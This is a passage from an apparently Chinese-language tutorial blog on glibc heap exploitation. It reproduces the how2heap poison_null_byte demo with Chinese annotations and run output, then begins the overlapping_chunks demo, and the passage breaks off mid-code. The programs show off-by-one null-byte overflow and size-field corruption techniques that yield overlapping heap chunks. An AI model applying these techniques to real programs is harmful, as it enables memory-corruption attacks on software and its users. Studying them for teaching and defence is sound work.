class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br>	<span class="hljs-type">uint8_t</span>* a;<br><br>	<span class="hljs-type">uint8_t</span>* b;<br><br>	<span class="hljs-type">uint8_t</span>* c;<br><br>	<span class="hljs-type">uint8_t</span>* b1;<br><br>	<span class="hljs-type">uint8_t</span>* b2;<br><br>	<span class="hljs-type">uint8_t</span>* d;<br><br>	<span class="hljs-type">void</span> *barrier;<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br><br>	a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br>	<span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-comment">// 我们想要溢出a，那么我们就需要知道a的真实大小</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><br>		<span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><br><br>	<span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * the amount requested plus some amount required for the metadata. */</span><br><br>	b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br>	c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br><br><br>	barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-comment">// barrier是为了防止堆块c与top chunk合并</span><br>		<span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><br><br>	<span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><br>	<span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><br>	<span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><br>	<span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-comment">// glibc2.26中对释放的当前堆块大小和下一个堆块的prev_size的大小作比较以对抗单字节溢出</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><br>		<span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><br>	<span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><br>	<span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br><br>	*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><br><span class="hljs-comment">// 这项技术会用于溢出改写一个释放的堆块</span><br>	<span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><br>	<span class="hljs-built_in">free</span>(b);<br><br>	<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><span class="hljs-comment">// 使b的大小收缩</span><br>	a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><br><br>	<span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><br><br>	<span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><br>	<span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><br>	<span class="hljs-comment">// will detect the heap corruption now.</span><br><br>	<span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// 这里我们看到b的size为0x200（被修改之前是0x210）</span><br>	<span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// 下一个chunk的位置所在</span><br>	<span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// 为了绕过检查，我们需要在下一个chunk的pre_sive写上我们堆块b的大小</span><br>	<span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br><br>		*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br><br>	b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-comment">// 现在我们申请的b1会在b所在的位置</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-comment">// 本该chunk c的pre_size应该被更新，但是实际上没有</span><br>		<span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-comment">// 事实上，在chunk c的上方0x10偏移处的地方更新了pre_size，即为0xf0</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><br>		<span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-comment">// 这里我们将申请即将被覆盖的堆块</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br>	<span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br><br><br>	b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><br><br>	<span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><br><span class="hljs-comment">// 当我们free b1和c时，将会跳过b2直接合并，再次分配时，就会产生堆块重叠</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><br><br>	<span class="hljs-built_in">free</span>(b1);<br><br>	<span class="hljs-built_in">free</span>(c);<br><br>	<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br><br>	d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br>	<br><span class="hljs-comment">// 现在堆块d和b2重叠</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><br>	<span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><br>		<span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><br><br>	assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/off_by_one$ ./poison_null_byte<br>Welcome to poison null byte <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique only works with disabled tcache-option <span class="hljs-keyword">for</span> glibc, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br>We allocate <span class="hljs-number">0x100</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span>.<br>a: <span class="hljs-number">0xe29010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need to know the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> (it may be more than <span class="hljs-number">0x100</span> because of rounding): <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0xe29120</span><br>c: <span class="hljs-number">0xe29330</span><br>We allocate a barrier at <span class="hljs-number">0xe29440</span>, so that c is not consolidated with the top-chunk when freed.<br>The barrier is not strictly necessary, but makes things less confusing<br>In newer versions of glibc we will need to have our updated size inside b itself to pass the check <span class="hljs-string">&#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;</span><br>b.size: <span class="hljs-number">0x211</span><br>b.size is: (<span class="hljs-number">0x200</span> + <span class="hljs-number">0x10</span>) | prev_in_use<br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x200</span><br>c.prev_size is <span class="hljs-number">0x210</span><br>We will pass the check since <span class="hljs-title function_">chunksize</span><span class="hljs-params">(P)</span> == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>b1: <span class="hljs-number">0xe29120</span><br>Now we <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b1&#x27;</span>. It will be placed where <span class="hljs-string">&#x27;b&#x27;</span> was. At this point c.prev_size should have been updated, but it was not: <span class="hljs-number">0x210</span><br>Interestingly, the updated value of c.prev_size has been written <span class="hljs-number">0x10</span> bytes before c.prev_size: f0<br>We <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b2&#x27;</span>, our <span class="hljs-string">&#x27;victim&#x27;</span> chunk.<br>b2: <span class="hljs-number">0xe29230</span><br>Current b2 content:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>Now we <span class="hljs-built_in">free</span> <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span>: this will consolidate the chunks <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span> (forgetting about <span class="hljs-string">&#x27;b2&#x27;</span>).<br>Finally, we allocate <span class="hljs-string">&#x27;d&#x27;</span>, overlapping <span class="hljs-string">&#x27;b2&#x27;</span>.<br>d: <span class="hljs-number">0xe29120</span><br>Now <span class="hljs-string">&#x27;d&#x27;</span> and <span class="hljs-string">&#x27;b2&#x27;</span> overlap.<br>New b2 content:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br>Thanks to https:<span class="hljs-comment">//www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.</span><br></code></pre></td></tr></table></figure>



<h2 id="Overlapping"><a href="#Overlapping" class="headerlink" title="Overlapping"></a>Overlapping</h2><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><p>从unsortedbin中取出chunk的时候，只会简单的检查其size是否在合理的范围之内，而不会去检查和当前bins的标志大小是否相同，所以当我们取出的chunk符合要求就会返还给我们。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">扩展已释放的堆块</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> A simple tale of overlapping chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br><br><br><br>	<span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);<br><br><br><br>	p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>	p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>	p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);<br><br><br><br>	<span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>	<span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>	<span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(p2);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);<br><br><br><span class="hljs-comment">// 假设有一个堆溢出漏洞能够改写堆块p2的大小</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span><br><span class="hljs-comment">// 我们最好还是保留堆块的标志位</span><br>		<span class="hljs-string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span><br><span class="hljs-comment">// 防止堆块p1被误认为释放的chunk</span><br>		<span class="hljs-string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);<br><br><br><br>	<span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;	<span class="hljs-comment">// 恶意的chunk的size</span><br><br>	<span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;	<span class="hljs-comment">// 我们请求的chunk的大小</span><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,<br><br>		 evil_chunk_size, evil_region_size);<br><br><br><span class="hljs-comment">// 修改堆块p2的大小为恶意的size</span><br>	*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span><br><br>	       <span class="hljs-string">&quot;size of the chunk p2 injected size\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span><br><br>	       <span class="hljs-string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);<br><br>	p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br><br><span class="hljs-comment">// p4开始的位置和结束的位置</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br><span class="hljs-comment">// p3开始的位置和结束的位置</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 should overlap with 